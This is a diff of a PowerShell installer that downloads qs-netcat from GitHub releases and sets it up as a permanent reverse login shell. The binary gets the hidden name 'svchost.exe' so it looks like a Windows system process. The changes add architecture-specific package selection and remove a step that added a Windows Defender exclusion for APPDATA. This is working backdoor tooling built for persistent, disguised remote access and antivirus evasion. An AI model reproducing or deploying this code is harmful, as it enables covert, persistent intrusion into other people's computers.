@@ -1,3 +1,10 @@
+# Install and start a permanent qs-netcat reverse login shell
+#
+# See https://qsocket.io/ for examples.
+# 
+# $env:DEBUG=1 for verbose output.
+
+$GITHUB_REPO="https://api.github.com/repos/qsocket"
 $QS_UTIL="qs-netcat"
 $QS_BIN_NAME="qs-netcat.exe"
 $QS_BIN_HIDDEN_NAME="svchost.exe"
@@ -77,10 +84,22 @@ function Is-Administrator
 
 function Get-Latest-Release  
 {
+
+    $QS_PACKAGE="windows_386.tar.gz"
+    Switch ($Env:PROCESSOR_ARCHITECTURE)
+    {
+        "x86" {$QS_PACKAGE="windows_386.tar.gz"}
+        "AMD64" {$QS_PACKAGE="windows_amd64.tar.gz"}
+        "ARM64" {$QS_PACKAGE="windows_arm64.tar.gz"}
+        "ARM" {$QS_PACKAGE="windows_arm.tar.gz"}
+        default {Print-Fatal "Unsupported Windows architecture!"}
+    }
+    Print-Debug "Package: $QS_PACKAGE"
+
     try {
-        $r = Invoke-WebRequest "https://api.github.com/repos/qsocket/$QS_UTIL/releases/latest"
+        $r = Invoke-WebRequest "$GITHUB_REPO/$QS_UTIL/releases/latest"
         $lines = $r.Content.Split('"')
-        $uri=(echo $lines | Select-String '/releases/download/' | Select-String "windows_386.tar.gz")
+        $uri=(echo $lines | Select-String '/releases/download/' | Select-String "$QS_PACKAGE")
     }catch {
         Print-Debug $_.Exception
         throw $_.Exception
@@ -218,16 +237,6 @@ try {
 
 if ($SECRET.Length -eq 0) {
     Print-Fatal "QSocket binary not working properly! Exiting..."
-}
-
-if (Is-Administrator) {
-    Print-Progress "Adding defender exclusion path"
-    try {
-        Add-MpPreference -ExclusionPath "$env:APPDATA" >$null
-        Print-Ok
-    }catch {
-        Print-Fail
-    }
 }
 
 try {
